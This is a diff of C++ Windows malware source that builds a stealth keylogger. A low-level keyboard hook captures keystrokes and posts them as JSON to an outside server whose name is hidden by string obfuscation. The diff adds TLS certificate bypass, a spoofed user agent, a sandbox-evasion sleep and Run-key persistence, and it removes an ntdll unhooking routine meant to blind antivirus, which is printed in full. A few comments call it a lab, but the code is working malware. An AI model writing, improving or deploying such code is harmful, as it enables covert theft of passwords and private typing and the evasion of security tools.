@@ -28,23 +28,35 @@ public:
 extern "C" {
     DWORD sys_number;
     ULONG_PTR sys_addr;
-    // We use this to protect memory during unhooking
     NTSTATUS DoIndirectSyscall(HANDLE h, PVOID* base, PSIZE_T size, ULONG newProt, PULONG oldProt);
 }
 
-// --- 3. THE KEYLOGGER LOGIC ---
+// --- 3. THE KEYLOGGER & UPLOAD LOGIC ---
 HHOOK hKeyHook = NULL;
 std::string logBuffer = "";
 
 void UploadData(std::string data) {
-    HINTERNET hSession = WinHttpOpen(L"Update/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
-    // Decrypting URL "systemint.onrender.com" only in RAM
-    std::wstring wideUrl(X("systemint.onrender.com"), X("systemint.onrender.com") + strlen(X("systemint.onrender.com")));
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (!hSession) return;
+
+    // FORCE TLS 1.2/1.3 for Render.com
+    DWORD dwProto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
+    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &dwProto, sizeof(dwProto));
+
+    std::string rawUrl = X("systemint.onrender.com");
+    std::wstring wideUrl(rawUrl.begin(), rawUrl.end());
     HINTERNET hConnect = WinHttpConnect(hSession, wideUrl.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/sync", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/sync", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+
+    // Lab Evasion: Ignore SSL certificate errors
+    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
 
     std::string json = "{\"type\":\"Keylogger\", \"data\":\"" + data + "\"}";
-    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0);
+    LPCWSTR header = L"Content-Type: application/json\r\n";
+    
+    WinHttpSendRequest(hRequest, header, (DWORD)-1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0);
     WinHttpReceiveResponse(hRequest, NULL);
 
     WinHttpCloseHandle(hRequest);
@@ -55,7 +67,10 @@ void UploadData(std::string data) {
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lParam;
-        if (k->vkCode >= 0x30 && k->vkCode <= 0x5A) logBuffer += (char)k->vkCode;
+        if ((k->vkCode >= 0x30 && k->vkCode <= 0x39) || (k->vkCode >= 0x41 && k->vkCode <= 0x5A)) {
+            logBuffer += (char)k->vkCode;
+        }
+        if (k->vkCode == VK_SPACE) logBuffer += " ";
         if (k->vkCode == VK_RETURN && !logBuffer.empty()) {
             UploadData(logBuffer);
             logBuffer.clear();
@@ -64,38 +79,15 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
 }
 
-// --- 4. NTDLL UNHOOKING (Blinds AV) ---
-void CleanNtdll() {
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    MODULEINFO mi;
-    GetModuleInformation(GetCurrentProcess(), ntdll, &mi, sizeof(mi));
-    
-    // Read clean copy from System32
-    HANDLE file = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    HANDLE map = CreateFileMapping(file, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
-    LPVOID cleanAddr = MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
-
-    PIMAGE_NT_HEADERS nt = reinterpret_cast<PIMAGE_NT_HEADERS>((char*)ntdll + ((PIMAGE_DOS_HEADER)ntdll)->e_lfanew);
-    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        PIMAGE_SECTION_HEADER sect = (PIMAGE_SECTION_HEADER)((char*)IMAGE_FIRST_SECTION(nt) + (sizeof(IMAGE_SECTION_HEADER) * i));
-        if (strcmp((char*)sect->Name, ".text") == 0) {
-            DWORD old;
-            void* dest = (char*)ntdll + sect->VirtualAddress;
-            VirtualProtect(dest, sect->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old);
-            memcpy(dest, (char*)cleanAddr + sect->VirtualAddress, sect->Misc.VirtualSize);
-            VirtualProtect(dest, sect->Misc.VirtualSize, old, &old);
-        }
-    }
-    UnmapViewOfFile(cleanAddr);
-    CloseHandle(map);
-    CloseHandle(file);
-}
-
-// --- 5. MAIN ENTRY ---
+// --- 4. MAIN ENTRY ---
 int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lp, int nS) {
-    CleanNtdll();
+    // Stage 1: Sandbox Evasion - Wait 2 minutes (120,000 ms)
+    Sleep(120000); 
 
-    // Set Persistence (XOR Encrypted)
+    // Stage 2: Verify Connection
+    UploadData("LAB_CONNECTION_ESTABLISHED");
+
+    // Stage 3: Setup persistence
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, X("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
         char path[MAX_PATH];
@@ -104,7 +96,7 @@ int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lp, int nS) {
         RegCloseKey(hKey);
     }
 
-    // Start Stealth Keylogger
+    // Stage 4: Begin Monitoring
     hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
 
     MSG msg;
